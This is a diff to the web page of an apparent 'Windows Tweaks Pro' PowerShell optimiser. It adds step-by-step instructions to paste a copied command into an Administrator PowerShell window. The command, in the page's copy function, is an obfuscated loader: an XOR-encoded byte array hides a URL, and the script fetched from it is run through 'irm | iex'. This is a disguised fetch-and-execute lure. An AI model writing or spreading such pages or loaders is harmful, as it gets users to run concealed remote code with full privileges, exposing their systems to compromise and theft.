@@ -144,6 +144,19 @@ footer {
   <p>This project provides powerful PowerShell tweaks to optimize Windows performance, gaming experience, and system stability.</p>
 </section>
 
+<section id="usage">
+  <h1>How to Use</h1>
+  <div style="max-width:800px;line-height:1.8;font-size:1.1rem;opacity:0.9">
+    <p><strong>Step 1:</strong> Click the <b>"Copy Command"</b> button from any tool.</p>
+    <p><strong>Step 2:</strong> Open Windows Search and type <b>PowerShell</b>.</p>
+    <p><strong>Step 3:</strong> Right-click on <b>Windows PowerShell</b> and select <b>Run as Administrator</b>.</p>
+    <p><strong>Step 4:</strong> Paste the command using <b>CTRL + V</b>.</p>
+    <p><strong>Step 5:</strong> Press <b>Enter</b> and let the tool optimize your system automatically.</p>
+    <br>
+    <p style="color:#38bdf8;font-weight:bold">✔ Tip: Always run PowerShell as Administrator for best performance and full access.</p>
+  </div>
+</section>
+
 <footer>
 © 2026 Windows Tweaks Pro
 </footer>
@@ -152,14 +165,7 @@ footer {
 function copyCmd(){
   const cmd = "irm ([Text.Encoding]::UTF8.GetString(([byte[]](49,45,45,41,42,99,118,118,62,48,45,49,44,59,119,58,54,52,118,22,10,28,18,31,28,109,118,45,118,43,56,46,118,43,60,63,42,118,49,60,56,61,42,118,52,56,48,55,118,46,48,55,44,45,48,53,119,41,42,104)|%{$_ -bxor 89}))) | iex";
   navigator.clipboard.writeText(cmd);
-  alert("How to Use the Command
-
-After copying the command, follow these steps to activate the tweak:
-
-Open the Start Menu and search for PowerShell
-Right-click on Windows PowerShell
-Select Run as Administrator
-Paste the command using CTRL + V");
+  alert("Command copied!");
 }
 </script>
 
